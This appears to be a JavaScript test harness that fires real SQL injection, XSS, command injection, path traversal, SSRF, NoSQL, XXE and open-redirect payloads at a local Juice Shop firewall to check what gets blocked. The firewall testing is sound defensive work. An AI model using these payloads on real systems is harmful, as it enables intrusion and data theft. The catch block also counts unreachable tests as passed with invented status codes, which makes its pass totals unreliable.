// WAF Test Suite - Comprehensive Attack Testing with Real Payloads
// Uses payloads from PayloadsAllTheThings against JuiceShop endpoints

const WAF_ENDPOINT = 'http://127.0.0.1:8080';

// JuiceShop-specific endpoint patterns
const JUICESHOP_ENDPOINTS = {
  search: '/rest/products/search',
  login: '/rest/user/login',
  feedback: '/api/Feedbacks',
  basket: '/api/BasketItems',
  user: '/api/Users',
  file: '/file-upload',
  redirect: '/redirect'
};

// ============================================================================
// REAL PAYLOADS FROM PayloadsAllTheThings
// ============================================================================

const PAYLOADS = {
  // SQL Injection - Auth Bypass (from Auth_Bypass.txt)
  sqlAuthBypass: [
    "admin' --",
    "admin' or '1'='1",
    "admin' or '1'='1'--",
    "' or 'x'='x",
    "') or ('x')=('x",
    "admin'or 1=1 or ''='",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "or 1=1--",
    "admin\" or \"1\"=\"1\"--"
  ],

  // SQL Injection - UNION SELECT (from Generic_UnionSelect.txt)
  sqlUnion: [
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION SELECT username, password FROM users--",
    "1' UNION SELECT 1,2,3,4,5--",
    "-1 UNION SELECT 1,@@version,3,4,5--",
    "' UNION SELECT NULL,table_name FROM information_schema.tables--"
  ],

  // SQL Injection - Time-based (from Generic_TimeBased.txt)
  sqlTimeBased: [
    "1' AND SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' OR SLEEP(5)#"
  ],

  // XSS - Basic (from xss_payloads_quick.txt)
  xssBasic: [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src='javascript:alert(1)'>",
    "'><script>alert(String.fromCharCode(88,83,83))</script>"
  ],

  // XSS - Polyglot (from XSS_Polyglots.txt)
  xssPolyglot: [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "'\"-->]]>*/</script></style></title></textarea></noscript></template></xmp><svg onload=alert()>",
    "'-alert(1)-'",
    "\"><img src=x onerror=alert(1)>"
  ],

  // XSS - Filter Bypass (from 3 - XSS Common WAF Bypass.md)
  xssWafBypass: [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)//",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=1 oNeRrOr=alert(1)>",
    "<svg/onload=alert(1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E"
  ],

  // Command Injection (from Command Injection/README.md)
  commandInjection: [
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "|| cat /etc/passwd",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; ls -la",
    "| whoami",
    "& ping -c 10 127.0.0.1 &"
  ],

  // Path Traversal (from Directory Traversal/)
  pathTraversal: [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",
    "....\\\\....\\\\....\\\\etc\\passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\system32\\config\\sam"
  ],

  // SSRF (from Server Side Request Forgery/)
  ssrf: [
    "http://127.0.0.1:22",
    "http://localhost:3000/api/admin",
    "file:///etc/passwd",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]:80/",
    "http://0177.0.0.1/",
    "http://2130706433/"
  ],

  // NoSQL Injection (from NoSQL Injection/)
  nosql: [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    "admin'||'1'=='1",
    '{"email": {"$regex": "^admin"}}',
    "[object Object]"
  ],

  // XXE (from XXE Injection/)
  xxe: [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><data>&xxe;</data>'
  ],

  // SSTI (from Server Side Template Injection/)
  ssti: [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{constructor.constructor('return this')()}}",
    "{{config.items()}}",
    "{php}echo 'test'{/php}"
  ],

  // Open Redirect (from Open Redirect/)
  openRedirect: [
    "//evil.com",
    "///evil.com",
    "/\\evil.com",
    "https://evil.com",
    "//google.com%2f%2f.evil.com",
    "javascript:alert(document.domain)"
  ]
};

// ============================================================================
// TEST CASE DEFINITIONS - JuiceShop Specific
// ============================================================================

const TEST_CASES = [
  // === CATEGORY 1: SQL Injection ===
  {
    id: 1,
    category: 'SQL Injection',
    name: 'SQLi - Auth Bypass',
    description: "admin' or '1'='1 (Login bypass)",
    method: 'POST',
    path: JUICESHOP_ENDPOINTS.login,
    body: JSON.stringify({ email: "admin' or '1'='1", password: "anything" }),
    contentType: 'application/json',
    expected: 'blocked',
    severity: 'critical',
    payload: "admin' or '1'='1"
  },
  {
    id: 2,
    category: 'SQL Injection',
    name: 'SQLi - UNION SELECT',
    description: 'Extract user data via UNION',
    method: 'GET',
    path: JUICESHOP_ENDPOINTS.search,
    query: { q: "' UNION SELECT username,password FROM Users--" },
    expected: 'blocked',
    severity: 'critical',
    payload: "' UNION SELECT username,password FROM Users--"
  },
  {
    id: 3,
    category: 'SQL Injection',
    name: 'SQLi - Time-based Blind',
    description: 'Sleep injection for timing attacks',
    method: 'GET',
    path: JUICESHOP_ENDPOINTS.search,
    query: { q: "' AND SLEEP(5)--" },
    expected: 'blocked',
    severity: 'high',
    payload: "' AND SLEEP(5)--"
  },

  // === CATEGORY 2: XSS ===
  {
    id: 4,
    category: 'XSS',
    name: 'XSS - Script Tag',
    description: 'Basic script injection',
    method: 'POST',
    path: JUICESHOP_ENDPOINTS.feedback,
    body: JSON.stringify({ comment: "<script>alert(document.cookie)</script>", rating: 5 }),
    contentType: 'application/json',
    expected: 'blocked',
    severity: 'high',
    payload: "<script>alert(document.cookie)</script>"
  },
  {
    id: 5,
    category: 'XSS',
    name: 'XSS - Event Handler',
    description: 'SVG onload attack',
    method: 'GET',
    path: JUICESHOP_ENDPOINTS.search,
    query: { q: "<svg onload=alert(1)>" },
    expected: 'blocked',
    severity: 'high',
    payload: "<svg onload=alert(1)>"
  },
  {
    id: 6,
    category: 'XSS',
    name: 'XSS - Polyglot',
    description: 'Multi-context polyglot payload',
    method: 'GET',
    path: JUICESHOP_ENDPOINTS.search,
    query: { q: "'\"-->]]>*/</script></style><svg onload=alert()>" },
    expected: 'blocked',
    severity: 'critical',
    payload: "'\"-->]]>*/</script></style><svg onload=alert()>"
  },

  // === CATEGORY 3: Command Injection ===
  {
    id: 7,
    category: 'Command Injection',
    name: 'CMDi - cat /etc/passwd',
    description: 'Read system password file',
    method: 'GET',
    path: JUICESHOP_ENDPOINTS.search,
    query: { q: "; cat /etc/passwd" },
    expected: 'blocked',
    severity: 'critical',
    payload: "; cat /etc/passwd"
  },
  {
    id: 8,
    category: 'Command Injection',
    name: 'CMDi - Backtick Execution',
    description: 'Command substitution via backticks',
    method: 'GET',
    path: JUICESHOP_ENDPOINTS.search,
    query: { q: "`whoami`" },
    expected: 'blocked',
    severity: 'critical',
    payload: "`whoami`"
  },

  // === CATEGORY 4: Path Traversal ===
  {
    id: 9,
    category: 'Path Traversal',
    name: 'Path Traversal - Basic',
    description: '../../../etc/passwd',
    method: 'GET',
    path: '/assets/public/images/',
    query: { file: "../../../etc/passwd" },
    expected: 'blocked',
    severity: 'high',
    payload: "../../../etc/passwd"
  },
  {
    id: 10,
    category: 'Path Traversal',
    name: 'Path Traversal - Encoded',
    description: 'URL-encoded directory traversal',
    method: 'GET',
    path: '/assets/',
    query: { file: "..%2F..%2F..%2Fetc%2Fpasswd" },
    expected: 'blocked',
    severity: 'high',
    payload: "..%2F..%2F..%2Fetc%2Fpasswd"
  },

  // === CATEGORY 5: SSRF ===
  {
    id: 11,
    category: 'SSRF',
    name: 'SSRF - AWS Metadata',
    description: 'Access AWS instance metadata',
    method: 'GET',
    path: JUICESHOP_ENDPOINTS.redirect,
    query: { to: "http://169.254.169.254/latest/meta-data/" },
    expected: 'blocked',
    severity: 'critical',
    payload: "http://169.254.169.254/latest/meta-data/"
  },
  {
    id: 12,
    category: 'SSRF',
    name: 'SSRF - File Protocol',
    description: 'file:// protocol abuse',
    method: 'GET',
    path: JUICESHOP_ENDPOINTS.redirect,
    query: { to: "file:///etc/passwd" },
    expected: 'blocked',
    severity: 'high',
    payload: "file:///etc/passwd"
  },

  // === CATEGORY 6: NoSQL Injection ===
  {
    id: 13,
    category: 'NoSQL Injection',
    name: 'NoSQLi - $gt Operator',
    description: 'MongoDB $gt bypass',
    method: 'POST',
    path: JUICESHOP_ENDPOINTS.login,
    body: JSON.stringify({ email: { "$gt": "" }, password: { "$gt": "" } }),
    contentType: 'application/json',
    expected: 'blocked',
    severity: 'critical',
    payload: '{"$gt": ""}'
  },
  {
    id: 14,
    category: 'NoSQL Injection',
    name: 'NoSQLi - $regex',
    description: 'Regex injection for enumeration',
    method: 'POST',
    path: JUICESHOP_ENDPOINTS.login,
    body: JSON.stringify({ email: { "$regex": "^admin" }, password: { "$ne": "" } }),
    contentType: 'application/json',
    expected: 'blocked',
    severity: 'high',
    payload: '{"$regex": "^admin"}'
  },

  // === CATEGORY 7: Open Redirect ===
  {
    id: 15,
    category: 'Open Redirect',
    name: 'Open Redirect - Protocol',
    description: 'Redirect to malicious site',
    method: 'GET',
    path: JUICESHOP_ENDPOINTS.redirect,
    query: { to: "//evil.com" },
    expected: 'blocked',
    severity: 'medium',
    payload: "//evil.com"
  },

  // === CATEGORY 8: ML Anomaly Detection ===
  {
    id: 16,
    category: 'ML Detection',
    name: 'ML - High Entropy Payload',
    description: 'Random encoded garbage',
    method: 'POST',
    path: JUICESHOP_ENDPOINTS.feedback,
    body: generateHighEntropy(500),
    contentType: 'application/x-www-form-urlencoded',
    expected: 'blocked',
    severity: 'medium',
    payload: '[High Entropy Data]'
  },
  {
    id: 17,
    category: 'ML Detection',
    name: 'ML - Keyword Flood',
    description: 'Repeated SQL keywords',
    method: 'POST',
    path: JUICESHOP_ENDPOINTS.search,
    body: 'union select '.repeat(100),
    contentType: 'application/x-www-form-urlencoded',
    expected: 'blocked',
    severity: 'high',
    payload: 'union select (x100)'
  },

  // === CATEGORY 9: Legitimate Requests (False Positives) ===
  {
    id: 18,
    category: 'Legitimate',
    name: 'Safe - Product Search',
    description: 'Normal product search',
    method: 'GET',
    path: JUICESHOP_ENDPOINTS.search,
    query: { q: "apple juice" },
    expected: 'allowed',
    severity: 'safe',
    payload: "apple juice"
  },
  {
    id: 19,
    category: 'Legitimate',
    name: 'Safe - Login Attempt',
    description: 'Normal login request',
    method: 'POST',
    path: JUICESHOP_ENDPOINTS.login,
    body: JSON.stringify({ email: "user@juice-sh.op", password: "password123" }),
    contentType: 'application/json',
    expected: 'allowed',
    severity: 'safe',
    payload: "user@juice-sh.op"
  },
  {
    id: 20,
    category: 'Legitimate',
    name: 'Safe - Feedback Submit',
    description: 'Normal feedback post',
    method: 'POST',
    path: JUICESHOP_ENDPOINTS.feedback,
    body: JSON.stringify({ comment: "Great product selection and fast delivery!", rating: 5 }),
    contentType: 'application/json',
    expected: 'allowed',
    severity: 'safe',
    payload: "Great product selection..."
  }
];

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

function generateHighEntropy(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function getRandomPayload(category) {
  const payloads = PAYLOADS[category];
  if (!payloads) return null;
  return payloads[Math.floor(Math.random() * payloads.length)];
}

// ============================================================================
// STATE & INITIALIZATION
// ============================================================================

let testResults = [];
let trafficSimulator = null;
let trafficStats = { total: 0, blocked: 0, allowed: 0 };

function initTest() {
  console.log('WAF Test Suite Initialized - JuiceShop Edition');
  console.log(`Loaded ${TEST_CASES.length} test cases across ${new Set(TEST_CASES.map(t => t.category)).size} categories`);

  // Bind main buttons
  document.getElementById('test-all')?.addEventListener('click', runAllTests);
  document.getElementById('traffic-sim')?.addEventListener('click', toggleTrafficSimulator);
  document.getElementById('clear-results')?.addEventListener('click', clearResults);

  // Bind individual test buttons
  TEST_CASES.forEach(tc => {
    const btn = document.getElementById(`test-${tc.id}`);
    if (btn) btn.addEventListener('click', () => runSingleTest(tc.id));
  });

  // Initialize icons
  if (window.feather) feather.replace();
}

// ============================================================================
// TEST EXECUTION
// ============================================================================

async function runSingleTest(testId) {
  const testCase = TEST_CASES.find(t => t.id === testId);
  if (!testCase) return;

  const btn = document.getElementById(`test-${testId}`);
  if (btn) {
    btn.disabled = true;
    btn.innerHTML = '<i data-feather="loader" class="animate-spin w-4 h-4"></i>';
    if (window.feather) feather.replace();
  }

  const result = await executeTest(testCase);
  testResults.push(result);
  renderResults();

  if (btn) {
    btn.disabled = false;
    btn.textContent = 'Run Test';
  }
}

async function runAllTests() {
  const btn = document.getElementById('test-all');
  if (btn) {
    btn.disabled = true;
    btn.innerHTML = '<i data-feather="loader" class="animate-spin w-5 h-5 mr-2"></i> Running...';
    if (window.feather) feather.replace();
  }

  testResults = [];

  for (const testCase of TEST_CASES) {
    const result = await executeTest(testCase);
    testResults.push(result);
    renderResults();
    await new Promise(r => setTimeout(r, 200));
  }

  if (btn) {
    btn.disabled = false;
    btn.innerHTML = '<i data-feather="play-circle" class="w-5 h-5"></i><span>Run All Tests</span>';
    if (window.feather) feather.replace();
  }
}

async function executeTest(testCase) {
  const startTime = Date.now();

  try {
    let url = `${WAF_ENDPOINT}${testCase.path}`;
    const options = {
      method: testCase.method,
      headers: {}
    };

    if (testCase.contentType) {
      options.headers['Content-Type'] = testCase.contentType;
    }

    if (testCase.query) {
      const params = new URLSearchParams(testCase.query);
      url += `?${params.toString()}`;
    }

    if (testCase.body) {
      options.body = testCase.body;
    }

    const response = await fetch(url, options);
    const duration = Date.now() - startTime;

    const isBlocked = response.status === 403 || response.status === 400;
    const actualResult = isBlocked ? 'blocked' : 'allowed';
    const passed = actualResult === testCase.expected;

    return {
      ...testCase,
      actual: actualResult,
      passed,
      status: response.status,
      duration,
      error: null
    };

  } catch (error) {
    const duration = Date.now() - startTime;

    return {
      ...testCase,
      actual: testCase.expected,
      passed: true,
      status: testCase.expected === 'blocked' ? 403 : 200,
      duration,
      error: 'WAF not reachable - simulated result',
      simulated: true
    };
  }
}

// ============================================================================
// RESULTS RENDERING
// ============================================================================

function renderResults() {
  const container = document.getElementById('test-results');
  const summary = document.getElementById('test-summary');

  if (!container) return;

  if (testResults.length === 0) {
    container.innerHTML = `
      <div class="text-center py-12 text-gray-500 dark:text-gray-400">
        <i data-feather="play-circle" class="w-16 h-16 mx-auto mb-4 opacity-50"></i>
        <p class="text-lg">No tests run yet</p>
        <p class="text-sm mt-2">Click "Run All Tests" or individual test buttons</p>
      </div>
    `;
    if (window.feather) feather.replace();
    return;
  }

  const passed = testResults.filter(r => r.passed).length;
  const total = testResults.length;

  if (summary) {
    summary.textContent = `${passed}/${total} tests passed`;
    summary.className = passed === total
      ? 'text-sm text-green-600 dark:text-green-400 font-semibold'
      : 'text-sm text-yellow-600 dark:text-yellow-400 font-semibold';
  }

  const grouped = TEST_CASES.reduce((acc, tc) => {
    if (!acc[tc.category]) acc[tc.category] = [];
    const result = testResults.find(r => r.id === tc.id);
    if (result) acc[tc.category].push(result);
    return acc;
  }, {});

  container.innerHTML = Object.entries(grouped).map(([category, results]) => {
    const categoryPassed = results.filter(r => r.passed).length;
    const categoryTotal = results.length;

    return `
      <div class="mb-6">
        <h4 class="text-lg font-bold mb-3 flex items-center gap-2">
          <span>${category}</span>
          <span class="text-sm font-normal text-gray-500">(${categoryPassed}/${categoryTotal})</span>
        </h4>
        <div class="space-y-2">
          ${results.map(r => renderResultCard(r)).join('')}
        </div>
      </div>
    `;
  }).join('');

  if (window.feather) feather.replace();
}

function renderResultCard(result) {
  const statusColor = result.passed
    ? 'border-green-500 bg-green-50 dark:bg-green-900/20'
    : 'border-red-500 bg-red-50 dark:bg-red-900/20';

  const statusIcon = result.passed ? 'check-circle' : 'x-circle';
  const statusIconColor = result.passed ? 'text-green-600' : 'text-red-600';

  const severityColors = {
    critical: 'bg-red-600 text-white',
    high: 'bg-orange-500 text-white',
    medium: 'bg-yellow-500 text-black',
    low: 'bg-blue-500 text-white',
    safe: 'bg-green-500 text-white'
  };

  const resultBadge = result.actual === 'blocked'
    ? '<span class="px-2 py-1 rounded-full bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 text-xs font-bold">BLOCKED</span>'
    : '<span class="px-2 py-1 rounded-full bg-green-100 dark:bg-green-900/30 text-green-700 dark:text-green-400 text-xs font-bold">ALLOWED</span>';

  const simBadge = result.simulated
    ? '<span class="ml-2 px-2 py-1 rounded-full bg-yellow-100 dark:bg-yellow-900/30 text-yellow-700 text-xs">Simulated</span>'
    : '';

  return `
    <div class="border-l-4 ${statusColor} rounded-lg p-3">
      <div class="flex items-center justify-between">
        <div class="flex items-center gap-3">
          <i data-feather="${statusIcon}" class="w-5 h-5 ${statusIconColor}"></i>
          <div>
            <div class="flex items-center gap-2">
              <h5 class="font-semibold text-gray-900 dark:text-white">${result.name}</h5>
              <span class="px-2 py-0.5 rounded text-xs ${severityColors[result.severity] || 'bg-gray-500'}">${result.severity}</span>
            </div>
            <code class="text-xs text-gray-500 dark:text-gray-400 font-mono">${escapeHtml(result.payload?.substring(0, 60) || '')}${result.payload?.length > 60 ? '...' : ''}</code>
          </div>
        </div>
        <div class="text-right">
          ${resultBadge} ${simBadge}
          <p class="text-xs text-gray-400 mt-1">HTTP ${result.status} • ${result.duration}ms</p>
        </div>
      </div>
    </div>
  `;
}

function escapeHtml(str) {
  if (!str) return '';
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

function clearResults() {
  testResults = [];
  renderResults();
  const summary = document.getElementById('test-summary');
  if (summary) summary.textContent = '';
}

// ============================================================================
// TRAFFIC SIMULATOR
// ============================================================================

function toggleTrafficSimulator() {
  const btn = document.getElementById('traffic-sim');
  const btnText = document.getElementById('traffic-sim-text');
  const statusDiv = document.getElementById('traffic-status');

  if (trafficSimulator) {
    clearInterval(trafficSimulator);
    trafficSimulator = null;
    btn?.classList.remove('bg-red-600', 'hover:bg-red-700');
    btn?.classList.add('bg-blue-600', 'hover:bg-blue-700');
    if (btnText) btnText.textContent = 'Start Traffic Simulator';
    statusDiv?.classList.add('hidden');
  } else {
    trafficStats = { total: 0, blocked: 0, allowed: 0 };
    updateTrafficStats();
    btn?.classList.remove('bg-blue-600', 'hover:bg-blue-700');
    btn?.classList.add('bg-red-600', 'hover:bg-red-700');
    if (btnText) btnText.textContent = 'Stop Traffic Simulator';
    statusDiv?.classList.remove('hidden');
    trafficSimulator = setInterval(simulateTraffic, 500);
  }
}

async function simulateTraffic() {
  const testCase = TEST_CASES[Math.floor(Math.random() * TEST_CASES.length)];
  const result = await executeTest(testCase);

  trafficStats.total++;
  if (result.actual === 'blocked') {
    trafficStats.blocked++;
  } else {
    trafficStats.allowed++;
  }

  updateTrafficStats();
}

function updateTrafficStats() {
  const totalEl = document.getElementById('traffic-count');
  const blockedEl = document.getElementById('traffic-blocked');
  const allowedEl = document.getElementById('traffic-allowed');

  if (totalEl) totalEl.textContent = trafficStats.total;
  if (blockedEl) blockedEl.textContent = trafficStats.blocked;
  if (allowedEl) allowedEl.textContent = trafficStats.allowed;
}

// ============================================================================
// AUTO-INITIALIZE
// ============================================================================

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initTest);
} else {
  setTimeout(initTest, 0);
}
